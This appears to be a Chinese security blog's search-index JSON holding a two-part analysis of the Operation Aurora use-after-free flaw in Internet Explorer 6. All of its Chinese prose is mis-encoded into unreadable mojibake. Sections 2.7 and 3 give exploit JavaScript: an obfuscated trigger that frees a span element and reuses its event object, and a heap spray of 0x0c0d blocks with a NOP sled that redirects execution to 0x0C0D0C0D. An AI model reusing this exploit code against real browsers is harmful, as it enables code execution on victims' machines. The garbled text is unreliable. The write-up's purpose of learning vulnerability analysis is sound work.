†å–·çš„å†…å®¹æœ‰å¯èƒ½ä¼šè¢«ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ç»™è¦†ç›–æ‰ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æ¼æ´åˆ©ç”¨å¤±è´¥ï¼Œéœ€è¦å¤šæ¬¡å°è¯• ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:1","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.2 windbgæŸ¥çœ‹è¯¦æƒ… é€šè¿‡windbgé™„åŠ è°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯åœ¨CElement::GetDocPtrè¿™ä¸ªå‡½æ•°äº§ç”Ÿäº†å´©æºƒï¼š windbgè°ƒè¯•è¯¦æƒ…\" windbgè°ƒè¯•è¯¦æƒ… ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œå´©æºƒåŸå› æ˜¯å› ä¸ºECXçš„å€¼ä¸º0x00000054ï¼Œè€Œä»[ECX]ä¸­å–å€¼äº§ç”Ÿäº†è®¿é—®å¼‚å¸¸ï¼Œé‚£ä¹ˆECXçš„å€¼æ˜¯å“ªæ¥çš„å‘¢ï¼Ÿ æ³¨æ„ åœ¨windbgä¸­æ˜¾ç¤ºç¬¦å·éœ€è¦ç¬¦å·æ–‡ä»¶æ”¯æŒï¼Œåœ¨è¿™é‡Œçš„è¯ï¼Œå¦‚æœæ²¡æœ‰mshtml.dllæ–‡ä»¶çš„ç¬¦å·æ–‡ä»¶ï¼Œæ˜¯æ˜¾ç¤ºä¸å‡ºæ¥å‡½æ•°åç§°çš„ ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:2","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.3 windbgæ ˆå›æº¯ é€šè¿‡windbgè¿›è¡Œæ ˆå›æº¯ï¼Œå¦‚ä¸‹ï¼š æ ˆå›æº¯\" æ ˆå›æº¯ ä»æ ˆå›æº¯ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨CElement::GetDocPtrçš„ä½ç½®æ˜¯CEventObj::GenericGetElementå‡½æ•°å’ŒCEventObj::get_srcElementå‡½æ•° ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:3","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.4 ECXå¯»æ‰¾ ä»åå¾€å‰åˆ†æï¼Œé¦–å…ˆåˆ†æCEventObj::GenericGetElementã€‚å°†mshtml.dllæ‹–å…¥IDA Proå¹¶ä¸”å®šä½åˆ°CEventObj::GenericGetElementå‡½æ•°(éœ€è¦ç¬¦å·æ–‡ä»¶æ”¯æŒ)ï¼Œæ‰¾åˆ°è°ƒç”¨CElement::GetDocPtrçš„ä½ç½®ï¼Œå¦‚ä¸‹å›¾ï¼š ECXå¯»æ‰¾\" ECXå¯»æ‰¾ ä»ä¸Šå›¾å¯çœ‹åˆ°ï¼Œè°ƒç”¨CElement::GetDocPträ¹‹å‰ï¼ŒECXçš„å€¼æ¥è‡ªEBXï¼Œè€ŒEBXåˆæ˜¯ä»[ESI]æ‰€æŒ‡å‘çš„å†…å­˜åœ°å€ä¸­å–å‡ºçš„å€¼ï¼Œé‚£ä¹ˆESIçš„å€¼æ˜¯å“ªæ¥çš„å‘¢ï¼Ÿ ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:4","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.5 ESIå¯»æ‰¾ ç°åœ¨è¦å¯»æ‰¾ESIçš„å€¼æ˜¯ä»å“ªæ¥çš„ã€‚å› ä¸ºcall CElement::GetDocPtrçš„ä½ç½®ä¸Šé¢å¾ˆå¤šåœ°æ–¹éƒ½å¯ä»¥è·³è½¬è¿‡æ¥ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œæˆ‘ç»è¿‡å¤šæ¬¡æµ‹è¯•ä¹‹åï¼Œè·Ÿè¸ªäº†è·³åˆ°è¿™çš„è·¯å¾„ï¼Œå¦‚ä¸‹ï¼š ESIå¯»æ‰¾\" ESIå¯»æ‰¾ æ€»ç»“ä¸‹æ¥å°±æ˜¯è¿™æ ·ï¼š EAX = [EBP-8] = CEventObj::GetParamå‡½æ•°è·å–çš„å€¼ ESI = [EAX] ECX = EBX = [ESI] ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:5","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.6 ECXçš„çœŸç›¸ é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œç»ˆäºææ¸…äº†ECXçš„æœ€ç»ˆæ¥æºæ˜¯[EBP-8]ã€‚ä½†è¿˜æ˜¯å¾ˆæ‡µé€¼ï¼Œ[EBP-8]é‡Œé¢åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œéœ€è¦çŸ¥é“CEventObj::GetParamè¿™ä¸ªå‡½æ•°è·å–äº†ä»€ä¹ˆæ‰è¡Œã€‚åœ¨ç½‘ä¸Šæœç´¢åˆ°çš„å…³äºè¿™ä¸ªçš„ä¸€äº›è¯´æ˜ï¼Œå¦‚ä¸‹ï¼š \" ä¹Ÿå°±æ˜¯è¯´CEventObj::GetParamè¿™ä¸ªå‡½æ•°æ˜¯è·å–EVENTPARAMè¿™ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆçš„ï¼Œé‚£ä¹ˆä¸Šé¢çš„æ€»ç»“åº”è¯¥å˜æˆè¿™æ ·ï¼š EAX = [EBP-8] = EVENTPARAMç»“æ„ä½“æŒ‡é’ˆ ESI = [EAX] = CTreeNodeç±»æŒ‡é’ˆ ECX = EBX = [ESI] = CImgElementç±»æŒ‡é’ˆ ç”¨C++è¡¨ç¤ºå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼šECX = EVENTPARAM.CTreeNode.CImgElement ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:6","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.7 æ ·æœ¬æ‰§è¡Œæµç¨‹ ç°åœ¨çŸ¥é“äº†ECXå°±æ˜¯CImgElementç±»æŒ‡é’ˆã€‚è€Œç¨‹åºå´©æºƒåŸå› æ˜¯å› ä¸ºECXçš„å€¼è¢«ä¿®æ”¹æˆäº†ä¸€ä¸ªé”™è¯¯çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´CImgElementç±»æŒ‡é’ˆæ˜¯é”™è¯¯çš„ã€‚è€ŒCImgElementç±»æŒ‡é’ˆæ˜¯ä¿å­˜åœ¨CTreeNodeç±»æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´ä¸­ï¼Œæ²¡çŒœé”™çš„è¯è¿™ä¸ªCImgElementç±»æŒ‡é’ˆæ˜¯CTreeNodeç±»å¯¹è±¡çš„ä¸€ä¸ªæˆå‘˜å±æ€§ã€‚ç±»æˆå‘˜å±æ€§è¢«æ”¹äº†ï¼Œé‚£å°±å¾—åˆ†æåˆ†æä¸ºä½•è¢«æ”¹äº†ï¼Œå¦‚ä¸‹ï¼š \" JavaScriptä¸æ˜¯å¾ˆå¥½ï¼Œä¸Šé¢çš„åˆ†æä¹Ÿæ˜¯é€šè¿‡ç½‘ä¸Šèµ„æ–™åˆ†æçš„ï¼Œåˆ†æçš„æ¯”è¾ƒä¹±ï¼Œå°†å°±ç€çœ‹å§ã€‚ä¸»è¦çš„æ‰§è¡Œæµç¨‹å°±æ˜¯ï¼š é€šè¿‡onloadäº‹ä»¶æ‰§è¡Œäº†ä¸€ä¸ªå‡½æ•° è¿›è¡Œå †å–·å°„ æ‹·è´äº†ä¸€ä¸ªäº‹ä»¶å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯spanåˆ›å»ºå‡ºçš„å¯¹è±¡ å°†spanåˆ›å»ºå‡ºçš„å¯¹è±¡ç»™é‡Šæ”¾äº† è®¾ç½®äº†ä¸€ä¸ªå®šæ—¶å™¨ï¼Œå»æ‰§è¡Œäº†æ‹·è´å¯¹è±¡çš„srcElementå‡½æ•° æœ€é‡è¦çš„ä¸¤ä¸ªå‡½æ•°è¯¦ç»†åˆ†æå¦‚ä¸‹ï¼š function WisgEgTNEfaONekEqaMyAUALLMYW(cpznAZhGdtOhTCNSVGLRdYeEfCAPKMeztpQnoKTGKsjrhhkoxCWPz) { // æ‰§è¡Œå †å–·å°„ gGyfqFvCYPRmXbnUWzBrulnwZVAJpUifKDiAZEKOqNHrfziGDtUOBqjYCtATBhClJkXjezUcmxBlfEX(); // æ‹·è´spanå¯¹è±¡ï¼Œä¿å­˜åœ¨ lTneQKOeMgwvXaqCPyQAaDDYAkd å˜é‡ä¸­ï¼Œæ‹·è´çš„å†…å®¹è‡³å°‘åŒ…æ‹¬äº† EVENTPARAMç»“æ„ä½“æŒ‡é’ˆ lTneQKOeMgwvXaqCPyQAaDDYAkd = document.createEventObject(cpznAZhGdtOhTCNSVGLRdYeEfCAPKMeztpQnoKTGKsjrhhkoxCWPz); // å°†spanå¯¹è±¡ç»™é‡Šæ”¾æ‰äº†ï¼Œä¹Ÿå°±æ˜¯å°†spanå¯¹è±¡çš„CTreeNodeç±»æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ç©ºé—´é‡Šæ”¾äº† document.getElementById(\"vhQYFCtoDnOzUOuxAflDSzVMIHYhjJojAOCHNZtQdlxSPFUeEthCGdRtiIY\").innerHTML = \"\"; // è®¾ç½®äº†ä¸€ä¸ªå®šæ—¶å™¨ window.setInterval(nayjNuSncnxGnhZDJrEXatSDkpo, 50); } // å®šæ—¶å™¨å‡½æ•° function nayjNuSncnxGnhZDJrEXatSDkpo() { p = \"\\u0c0f\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\"; // å¾ªç¯èµ‹å€¼ï¼Œç›®çš„å°±æ˜¯ä¸ºäº†è¦†ç›–spanå¯¹è±¡é‡Šæ”¾åçš„å†…å­˜ç©ºé—´ for (i = 0; i \u003c MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul.length; i++) { MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul[i].data = p; } // æ‰§è¡Œäº†æ‹·è´å˜é‡çš„srcElementå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨CEventObj::get_srcElementå‡½æ•°ã€CEventObj::GetParamå‡½æ•°ã€CElement::GetDocPtrå‡½æ•°ï¼Œæœ€åå½¢æˆå´©æºƒ var t = lTneQKOeMgwvXaqCPyQAaDDYAkd.srcElement; } ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:7","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.8 éªŒè¯çŒœæƒ³ ä¸Šé¢çš„å‡½æ•°åˆ†æï¼Œæˆ‘æ˜¯æ ¹æ®ç½‘ä¸Šçš„èµ„æ–™åˆ†æï¼Œå¹¶è¿›è¡Œå®éªŒåå†™çš„ã€‚CTreeNodeç±»æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´è¢«ä¿®æ”¹çš„åŸå› æ˜¯å› ä¸ºè¿™ä¸ªç±»è¢«é‡Šæ”¾äº†ï¼Œç„¶åå°±è¢«å…¶ä»–å˜é‡æ‰€è¦†ç›–äº†ã€‚è¿™é‡ŒéªŒè¯ä¸€ä¸‹ï¼Œè§‚å¯ŸCTreeNodeç±»æŒ‡é’ˆä¿®æ”¹çš„åŸå› æ˜¯å¦çœŸçš„æ˜¯å› ä¸ºç±»è¢«é‡Šæ”¾äº†ï¼š é¦–å…ˆä¿®æ”¹æ ·æœ¬ä»£ç ï¼š \" ç„¶ååœ¨æ‰§è¡ŒCElement::GetDocPtrçš„ä½ç½®ä¸‹æ–­ç‚¹ï¼Œå½“æ–­åœ¨æ­¤çš„æ—¶å€™ESIå°±æ˜¯CTreeNodeç±»æŒ‡é’ˆï¼š \" ç„¶åè®¿é—®ä¿®æ”¹å‰åçš„æ ·æœ¬ç½‘é¡µï¼Œå¯¹æ¯”è§‚å¯ŸESIæŒ‡å‘çš„å†…å­˜ç©ºé—´ï¼š ä¿®æ”¹å‰ï¼š \" ä¿®æ”¹åï¼š \" é€šè¿‡ä¸Šé¢çš„æµ‹è¯•ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºCTreeNodeç±»æŒ‡é’ˆçš„ç¡®æ˜¯åœ¨è¢«é‡Šæ”¾ä¹‹åæ‰è¢«ä¿®æ”¹çš„ï¼Œä¹Ÿå°±éªŒè¯äº†ä¸Šé¢çš„åˆ†æã€‚ ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:8","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.9 æ¼æ´æˆå›  éªŒè¯äº†CTreeNodeç±»æŒ‡é’ˆä¿®æ”¹çš„åŸå› ä¹‹åï¼Œæ¼æ´æˆå› ä¹Ÿå°±å¾ˆæ¸…æ¥šäº†ã€‚é€šä¿—ä¸€ç‚¹å°±æ˜¯new äº†ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå°†æŒ‡é’ˆå¤åˆ¶äº†ä¸€ä»½ï¼Œæ¥ç€é‡Šæ”¾äº†å¯¹è±¡ï¼Œç„¶åä½¿ç”¨å¤åˆ¶çš„æŒ‡é’ˆå»è·å–äº†å†…å®¹å¹¶æ‰§è¡Œï¼Œç”¨C++ä»£ç è¡¨ç¤ºå°±æ˜¯è¿™æ ·ï¼š class CMyclass { public: int GetNum() { return m_Num; } private: int m_Num = 10; }; int main() { CMyclass* pObj = new CMyclass(); std::cout \u003c\u003c \"pObj.m_Num = \" \u003c\u003c pObj-\u003eGetNum() \u003c\u003c std::endl; CMyclass* p = pObj; delete pObj; // ä½¿ç”¨å·²é‡Šæ”¾çš„æŒ‡é’ˆå»è°ƒç”¨æˆå‘˜å‡½æ•° std::cout \u003c\u003c \"p.m_Num = \" \u003c\u003c p-\u003eGetNum() \u003c\u003c std::endl; system(\"pause\"); return 0; } ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:9","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.10 å¼•å‘æ¼æ´çš„è¯­å¥ å¼•å‘æ¼æ´æœ€ä¸»è¦çš„ä¸‰æ¡è¯­å¥ï¼š å¼•å‘æ¼æ´çš„è¯­å¥\" å¼•å‘æ¼æ´çš„è¯­å¥ ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:10","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"3. æ¼æ´åˆ©ç”¨ æ—¢ç„¶éƒ½çŸ¥é“æ¼æ´æˆå› äº†ï¼Œå°±å¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨äº†ã€‚è¿™é‡Œåªé’ˆå¯¹IE6.0åˆ©ç”¨ä¸€ä¸‹ï¼Œå…¶ä»–çš„ç‰ˆæœ¬åˆè¦å»è€ƒè™‘ç»•è¿‡ä¿æŠ¤æœºåˆ¶çš„ä¸€äº›ä¸œè¥¿äº†ã€‚ é¦–å…ˆå°†å †å–·å°„çš„ä»£ç æ”¹ä¸€æ”¹ï¼š function gGyfqFvCYPRmXbnUWzBrulnwZVAJpUifKDiAZEKOqNHrfziGDtUOBqjYCtATBhClJkXjezUcmxBlfEX() { var mWgWGhyqOVxBPqtnAFWAyxhLnqBNaRNnkKvTfAwVuvOyCnGUwBPZEzSZtKpqGZUvPO = uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu('%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090'); var uafwHGfWUmxkIam = uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu(\"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"d\" + \"%u\" + \"0\" + \"c\" + \"0\" + \"d\"); do { uafwHGfWUmxkIam += uafwHGfWUmxkIam } while (uafwHGfWUmxkIam.length \u003c 0xd0000); for (S = 0; S \u003c 150; S++) JsgdlqtHVnnWiFMCpdxJheQbdjITPhdkurJqwIMuMxJnHf[S] = uafwHGfWUmxkIam + mWgWGhyqOVxBPqtnAFWAyxhLnqBNaRNnkKvTfAwVuvOyCnGUwBPZEzSZtKpqGZUvPO; } æ¥ç€åœ¨è°ƒç”¨CElement::GetDocPtrçš„ä½ç½®ä¸‹æ¡ä»¶æ–­ç‚¹ï¼šECX==0x0C0D0C0D \" æ¥ç€é‡æ–°è¿è¡ŒIEï¼Œç„¶åè®¿é—®ä¿®æ”¹åçš„æ ·æœ¬æ–‡ä»¶ï¼Œæ–­ä¸‹æ¥æ—¶ECXå·²ç»ä¸º0x0C0D0C0Dï¼š \" è·Ÿåˆ°CElement::GetDocPtrå»æ‰§è¡Œï¼Œå¯çœ‹åˆ°EAXè¢«èµ‹å€¼ä¸º0x0D0C0D0Cï¼Œè€Œæ‰§è¡Œçš„ä½ç½®ä¸º0x0C0D0C0Dï¼š \" ç„¶åè·Ÿè¿›å»æ‰§è¡Œï¼ŒCtrl+Bæœç´¢90909090ï¼Œç„¶åä¸‹æ–­ï¼Œè¿è¡Œï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºé¡ºåˆ©çš„æ‰§è¡Œåˆ°å¡«å……çš„90909090çš„ä½ç½®ï¼š \" ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:3:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4. END è¿™æ¬¡æ¼æ´åˆ†æå°±åˆ°è¿™é‡Œç»“æŸäº†ï¼Œä»æœ€å¼€å§‹çš„æµé‡åˆ†æã€æå–å‡ºæ ·æœ¬ï¼Œå†åˆ°åé¢çš„æ¼æ´æˆå› åˆ†æï¼Œæœ€ååˆ°æ¼æ´çš„åˆ©ç”¨ï¼Œè¿™ä¸€å¥—æµç¨‹ç®—æ˜¯å®Œæ•´çš„èµ°äº†ä¸€éï¼Œæ”¶è·è›®å¤§çš„ã€‚çœŸçš„æ„Ÿè§‰å‘ç°è¿™ä¸ªæ¼æ´çš„å¤§ä½¬æ˜¯çœŸçš„åŠï¼Œå°±æ˜¯ä¸çŸ¥é“é€šè¿‡å•¥æ–¹å¼æ‰¾åˆ°çš„è¿™ç§æ¼æ´ï¼Œè¿™æ˜¯ä¸€ä¸ªåå•Šã€‚è¿™æ¬¡è¿˜æ˜¯å¾ˆæ„Ÿè°¢æå‡ºè¿™ä¸ªæµé‡é¢˜çš„ @è€åˆ˜ï¼Œè¿˜æœ‰å¸®åŠ©äº†æˆ‘å¾ˆå¤šçš„ @æ¢¦è½©è€å“¥ã€‚ ç”±äºè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦UAFæ¼æ´ï¼Œä»¥åŠç¬¬ä¸€æ¬¡ä»æ¼æ´çš„ä¸€æ— æ‰€çŸ¥åˆ°æœ€ç»ˆå®Œæˆåˆ†æçš„è¿‡ç¨‹ï¼Œå…¶ä¸­éš¾å…ä¼šæœ‰åˆ†æé”™è¯¯çš„åœ°æ–¹ã€‚å¦‚æœå¤§ä½¬ä»¬å‘ç°æœ‰ä»€ä¹ˆä¸å¯¹çš„åœ°æ–¹ï¼Œæœ›æ–§æ­£ï¼ é—®é¢˜ å…¶å®è¿˜æœ‰å‡ ä¸ªç‚¹æœ‰ç–‘æƒ‘ï¼Œç­‰æœ‰æ—¶é—´å†ä¸€ä¸€åˆ†æï¼š æ ·æœ¬ä»£ç ä¸­æœ‰ä¸¤å¤„ç±»ä¼¼äºå †å–·çš„åœ°æ–¹ï¼Œä¸ºå•¥ä¼šæœ‰å¤šä¸ªï¼Ÿ äº‹ä»¶å¯¹è±¡è¯¦ç»†çš„æ‰§è¡Œæµç¨‹ å¦‚ä½•ä¿®å¤ä¸é˜²èŒƒ å‚è€ƒé“¾æ¥ çœ‹é›ªå¤§ä½¬çš„åˆ†æï¼šhttps://bbs.pediy.com/thread-105899-1.htm æ¢¦è½©è€å“¥çš„åˆ†æï¼šhttps://bbs.pediy.com/thread-251672.htm Ox9A82å¤§ä½¬çš„åˆ†æï¼šhttps://www.cnblogs.com/Ox9A82/p/5837769.html ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:4:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"æå…‰è¡ŒåŠ¨ï¼ŒAuroraï¼ŒæŠ›å¼€æ•æ„Ÿçš„å› ç´ å¤–ï¼Œå…¶æŠ€æœ¯æ‰‹æ®µå€¼å¾—è§‚æ‘©ï¼Œæ¬£èµé¡¶çº§é»‘å®¢çš„è¾ƒé‡å§ã€‚","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":" æ–‡ç« é“¾æ¥ æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ 1ï¼šæå–æ ·æœ¬ æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ 2ï¼šæ¼æ´æˆå› åˆ†æ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:0:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"1. æå…‰è¡ŒåŠ¨ä»‹ç» æ¥è‡ªç™¾åº¦ç™¾ç§‘ æå…‰è¡ŒåŠ¨ï¼ˆOperation Auroraï¼‰æˆ–æ¬§è‹¥æ‹‰è¡ŒåŠ¨æ˜¯2009å¹´12æœˆä¸­æ—¬å¯èƒ½æºè‡ªä¸­å›½çš„ä¸€åœºç½‘ç»œæ”»å‡»ï¼Œå…¶åç§°â€œAuroraâ€ï¼ˆæ„ä¸ºæå…‰ã€æ¬§è‹¥æ‹‰ï¼‰æ¥è‡ªæ”»å‡»è€…ç”µè„‘ä¸Šæ¶æ„æ–‡ä»¶æ‰€åœ¨è·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚é­å—æ”»å‡»çš„é™¤äº†Googleå¤–ï¼Œè¿˜æœ‰20å¤šå®¶å…¬å¸ï¼šå…¶ä¸­åŒ…æ‹¬Adobe Systemsã€Juniper Networksã€Rackspaceã€é›…è™ã€èµ›é—¨é“å…‹ã€è¯ºæ–¯æ´›æ™®Â·æ ¼é²é—¨å’Œé™¶æ°åŒ–å·¥ã€‚è¿™åœºæ”»å‡»è¿‡åï¼ŒGoogleæå‡ºäº†å®ƒçš„æ–°è®¡åˆ’ï¼šå®ƒå°†â€œåœ¨å¿…è¦çš„æ³•å¾‹èŒƒå›´å†…â€ï¼Œäºä¸­å›½è¿è¥ä¸€ä¸ªå®Œå…¨ä¸å—è¿‡æ»¤çš„æœç´¢å¼•æ“ï¼›åŒæ—¶Googleä¹Ÿæ‰¿è®¤ï¼Œå¦‚æœè¯¥è®¡åˆ’ä¸å¯å®ç°ï¼Œå®ƒå°†å¯èƒ½ç¦»å¼€ä¸­å›½å¹¶å…³é—­å®ƒåœ¨ä¸­å›½çš„åŠäº‹å¤„ã€‚ æ­¤æ¼æ´æ˜¯åŸºäº IE6.0 çš„ä¸€ä¸ªç»å…¸æ¼æ´ã€‚å¯èƒ½å› ä¸ºæŸäº›åŸå› ï¼Œè¿™ä¸ªæ¼æ´çš„åˆ†ææŠ¥å‘Šå‡ºå¥‡çš„å°‘ï¼Œèƒ½æœç´¢åˆ°çš„ç»å¤§å¤šæ•°æ˜¯å¦‚ä½•åˆ©ç”¨çš„ PoCï¼ŒæŠ±ç€å¯¹æ¼æ´æˆå› çš„å¥½å¥‡ï¼Œäºæ˜¯å¯¹è¯¥æ¼æ´æ¥äº†ä¸€æ¬¡è¯¦ç»†åˆ†æã€‚ å…¶å®è¿™ä¸ªæ¼æ´å¼€å§‹æˆ‘æ˜¯ä¸çŸ¥é“çš„ï¼Œæ˜¯å› ä¸º @è€åˆ˜ å‘æ¥ä¸€ä¸ªæµé‡åŒ…ï¼Œè€Œè¿™ä¸ªæµé‡åŒ…é‡Œå°±æ˜¯å—å®³è€…ç”¨ IE6.0 è®¿é—®æ”»å‡»è€…æ¶æ„æ„é€ çš„ç½‘ç«™åï¼Œè§¦å‘æ­¤æ¼æ´çš„ä¸€ä¸ªåœºæ™¯ã€‚æ‰€ä»¥æœ€å¼€å§‹å¯¹æ­¤æ¼æ´æ˜¯ä¸€æ— æ‰€çŸ¥çš„ï¼Œè¿™é‡Œæˆ‘æ˜¯å°†ä»æ‹¿åˆ°æµé‡åŒ…å¹¶åˆ†æã€ææƒæ ·æœ¬ã€åˆ†ææ¼æ´æˆå› ã€åˆ©ç”¨æ­¤æ¼æ´è¿™å‡ ä¸ªæ­¥éª¤ä¸€ä¸€è®°å½•ä¸‹æ¥ï¼Œç®—æ˜¯å¯¹æ•´å¥—åˆ†ææµç¨‹åšä¸ªè®°å½•ã€‚ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:1:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2. æµé‡åŒ…åˆ†æ 